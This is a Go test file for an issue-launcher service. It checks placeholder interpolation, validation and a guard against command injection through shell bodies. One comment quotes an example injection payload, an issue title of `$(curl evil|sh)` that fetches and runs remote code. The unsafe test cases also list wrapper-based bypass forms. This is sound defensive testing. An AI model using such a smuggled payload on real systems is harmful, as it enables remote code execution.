package launcher_test

import (
	"context"
	"errors"
	"testing"

	"github.com/hk9890/task-manager-ui/internal/domain"
	"github.com/hk9890/task-manager-ui/internal/launcher"
	"github.com/hk9890/task-manager-ui/internal/testing/fakes"
)

func TestServiceLaunchInterpolatesIssueContextAndDelegatesRunner(t *testing.T) {
	t.Parallel()

	runner := &fakes.FakeProcessRunner{}
	service, err := launcher.NewService([]launcher.Definition{{
		Action:  "opencode",
		Command: "tool-{{issue.id}}",
		Args: []string{
			"--title", "{{issue.title}}",
			"--labels", "{{issue.labels}}",
			"--assignee", "{{issue.assignee}}",
			"--root", "{{project.root}}",
		},
		Env: []string{
			"TASKMGR_UI_ISSUE_ID={{issue.id}}",
			"TASKMGR_UI_ISSUE_TITLE={{issue.title}}",
			"TASKMGR_UI_ISSUE_LABELS={{issue.labels}}",
			"TASKMGR_UI_ISSUE_ASSIGNEE={{issue.assignee}}",
			"TASKMGR_UI_PROJECT_ROOT={{project.root}}",
		},
		WorkDir: "{{project.root}}",
	}}, "/repo/root", runner)
	if err != nil {
		t.Fatalf("NewService returned error: %v", err)
	}

	issue := domain.IssueDetail{Summary: domain.IssueSummary{
		ID:       "bw-77",
		Title:    "Implement launcher framework",
		Assignee: "hans",
		Labels:   []string{"infra", "launcher"},
	}}

	if err := service.Launch(context.Background(), "opencode", issue); err != nil {
		t.Fatalf("Launch returned error: %v", err)
	}

	if len(runner.Calls) != 1 {
		t.Fatalf("expected exactly one process run, got %d", len(runner.Calls))
	}

	call := runner.Calls[0]
	if call.Command != "tool-bw-77" {
		t.Fatalf("expected interpolated command, got %q", call.Command)
	}
	if call.Dir != "/repo/root" {
		t.Fatalf("expected interpolated workdir /repo/root, got %q", call.Dir)
	}
	if len(call.Args) != 8 {
		t.Fatalf("expected interpolated args, got %#v", call.Args)
	}
	if call.Args[1] != "Implement launcher framework" || call.Args[3] != "infra,launcher" || call.Args[5] != "hans" || call.Args[7] != "/repo/root" {
		t.Fatalf("unexpected interpolated args: %#v", call.Args)
	}
	if len(call.Env) != 5 {
		t.Fatalf("expected interpolated env entries, got %#v", call.Env)
	}
	if call.Env[0] != "TASKMGR_UI_ISSUE_ID=bw-77" || call.Env[4] != "TASKMGR_UI_PROJECT_ROOT=/repo/root" {
		t.Fatalf("unexpected interpolated env: %#v", call.Env)
	}
}

func TestServiceLaunchDefaultsWorkDirToProjectRoot(t *testing.T) {
	t.Parallel()

	runner := &fakes.FakeProcessRunner{}
	service, err := launcher.NewService([]launcher.Definition{{Action: "editor", Command: "nvim"}}, "/repo/root", runner)
	if err != nil {
		t.Fatalf("NewService returned error: %v", err)
	}

	if err := service.Launch(context.Background(), "editor", domain.IssueDetail{}); err != nil {
		t.Fatalf("Launch returned error: %v", err)
	}

	if len(runner.Calls) != 1 || runner.Calls[0].Dir != "/repo/root" {
		t.Fatalf("expected default workdir /repo/root, got %#v", runner.Calls)
	}
}

func TestServiceLaunchPropagatesRunnerError(t *testing.T) {
	t.Parallel()

	wantErr := errors.New("spawn failed")
	runner := &fakes.FakeProcessRunner{Err: wantErr}
	service, err := launcher.NewService([]launcher.Definition{{Action: "editor", Command: "nvim"}}, "/repo/root", runner)
	if err != nil {
		t.Fatalf("NewService returned error: %v", err)
	}

	err = service.Launch(context.Background(), "editor", domain.IssueDetail{})
	if !errors.Is(err, wantErr) {
		t.Fatalf("expected runner error, got %v", err)
	}
}

func TestServiceLaunchReturnsErrorForUnknownAction(t *testing.T) {
	t.Parallel()

	service, err := launcher.NewService([]launcher.Definition{{Action: "editor", Command: "nvim"}}, "/repo/root", &fakes.FakeProcessRunner{})
	if err != nil {
		t.Fatalf("NewService returned error: %v", err)
	}

	err = service.Launch(context.Background(), "missing", domain.IssueDetail{})
	if err == nil {
		t.Fatal("expected error for undefined action")
	}
}

func TestServiceBuiltInDefinitionsForV1Actions(t *testing.T) {
	t.Parallel()

	runner := &fakes.FakeProcessRunner{}
	service, err := launcher.NewService([]launcher.Definition{
		{Action: "nvim", Command: "nvim", Args: []string{"[{{issue.id}}]", "{{issue.title}}"}},
		{Action: "opencode", Command: "opencode", Args: []string{"run", "--issue", "{{issue.id}}", "--title", "{{issue.title}}"}},
		// Safe shell pattern: issue fields are positional args ($0, …), never
		// interpolated into the -lc body (matches the real built-in definition).
		{Action: "shell-command", Command: "sh", Args: []string{"-lc", "printf '%s\\n' \"$0\"", "{{issue.id}}"}},
	}, "/repo/root", runner)
	if err != nil {
		t.Fatalf("NewService returned error: %v", err)
	}

	issue := domain.IssueDetail{Summary: domain.IssueSummary{ID: "bw-42", Title: "Launcher task"}}

	if err := service.Launch(context.Background(), "nvim", issue); err != nil {
		t.Fatalf("Launch nvim returned error: %v", err)
	}
	if err := service.Launch(context.Background(), "opencode", issue); err != nil {
		t.Fatalf("Launch opencode returned error: %v", err)
	}
	if err := service.Launch(context.Background(), "shell-command", issue); err != nil {
		t.Fatalf("Launch shell-command returned error: %v", err)
	}

	if len(runner.Calls) != 3 {
		t.Fatalf("expected three launch calls, got %d", len(runner.Calls))
	}

	if runner.Calls[0].Command != "nvim" || runner.Calls[1].Command != "opencode" || runner.Calls[2].Command != "sh" {
		t.Fatalf("unexpected built-in launcher commands: %#v", runner.Calls)
	}
}

func TestNewServiceValidatesInputs(t *testing.T) {
	t.Parallel()

	_, err := launcher.NewService([]launcher.Definition{{Action: "", Command: "nvim"}}, "/repo/root", &fakes.FakeProcessRunner{})
	if err == nil {
		t.Fatal("expected error for missing action")
	}

	_, err = launcher.NewService([]launcher.Definition{{Action: "editor", Command: ""}}, "/repo/root", &fakes.FakeProcessRunner{})
	if err == nil {
		t.Fatal("expected error for missing command")
	}

	_, err = launcher.NewService([]launcher.Definition{{Action: "editor", Command: "nvim"}, {Action: "editor", Command: "vi"}}, "/repo/root", &fakes.FakeProcessRunner{})
	if err == nil {
		t.Fatal("expected error for duplicate actions")
	}

	_, err = launcher.NewService([]launcher.Definition{{Action: "editor", Command: "nvim"}}, "/repo/root", nil)
	if err == nil {
		t.Fatal("expected error for nil runner")
	}
}

// TestNewServiceRejectsIssueFieldInShellBody asserts the shell-launcher security
// invariant is enforced at construction: a definition that interpolates an
// operator-untrusted issue field into a `sh -c`/`sh -lc` body is rejected,
// because issue content (e.g. a title like `$(curl evil|sh)`) would be re-parsed
// as code and executed (command injection / RCE via issue content).
func TestNewServiceRejectsIssueFieldInShellBody(t *testing.T) {
	t.Parallel()

	unsafe := []launcher.Definition{
		// Direct shell command with the issue field in the -c/-lc body.
		{Action: "danger", Command: "sh", Args: []string{"-c", "grep {{issue.title}} log"}},
		{Action: "danger", Command: "sh", Args: []string{"-lc", "echo {{issue.id}}"}},
		{Action: "danger", Command: "sh", Args: []string{"-lic", "run {{issue.assignee}}"}},
		// Separate -c flag after other shell options.
		{Action: "danger", Command: "sh", Args: []string{"-l", "-c", "echo {{issue.labels}}"}},
		// /bin/bash by absolute path (basename match).
		{Action: "danger", Command: "/bin/bash", Args: []string{"-c", "echo {{issue.title}}"}},
		// Exec wrappers fronting the shell must not bypass the guard (argv scan).
		{Action: "danger", Command: "env", Args: []string{"sh", "-c", "echo {{issue.title}}"}},
		{Action: "danger", Command: "/usr/bin/env", Args: []string{"bash", "-lc", "run {{issue.assignee}}"}},
		{Action: "danger", Command: "timeout", Args: []string{"10", "sh", "-c", "grep {{issue.id}} log"}},
		{Action: "danger", Command: "nice", Args: []string{"-n5", "sh", "-c", "echo {{issue.labels}}"}},
	}
	for _, def := range unsafe {
		if _, err := launcher.NewService([]launcher.Definition{def}, "/repo/root", &fakes.FakeProcessRunner{}); err == nil {
			t.Errorf("expected error for unsafe definition command=%q args=%v, got nil", def.Command, def.Args)
		}
	}

	// Safe forms must be accepted: issue field as a positional arg, and a
	// non-shell command whose args contain placeholders (no shell re-parsing).
	safe := []launcher.Definition{
		// Issue field as a positional arg ($0), not in the body.
		{Action: "ok", Command: "sh", Args: []string{"-lc", "printf '%s' \"$0\"", "{{issue.title}}"}},
		// Non-shell command whose args contain placeholders (no shell re-parsing).
		{Action: "ok", Command: "grep", Args: []string{"{{issue.title}}", "log"}},
		// Shell body with no issue placeholder.
		{Action: "ok", Command: "sh", Args: []string{"-c", "ls"}},
		// Exec wrapper + shell, but the issue field is a positional arg after the body.
		{Action: "ok", Command: "env", Args: []string{"sh", "-lc", "printf '%s' \"$0\"", "{{issue.id}}"}},
		// Issue field passed via env var (documented safe pattern, like opencode).
		{Action: "ok", Command: "mytool", Args: []string{"--run"}, Env: []string{"ISSUE={{issue.title}}"}},
	}
	for _, def := range safe {
		if _, err := launcher.NewService([]launcher.Definition{def}, "/repo/root", &fakes.FakeProcessRunner{}); err != nil {
			t.Errorf("expected safe definition command=%q args=%v to be accepted, got error: %v", def.Command, def.Args, err)
		}
	}
}
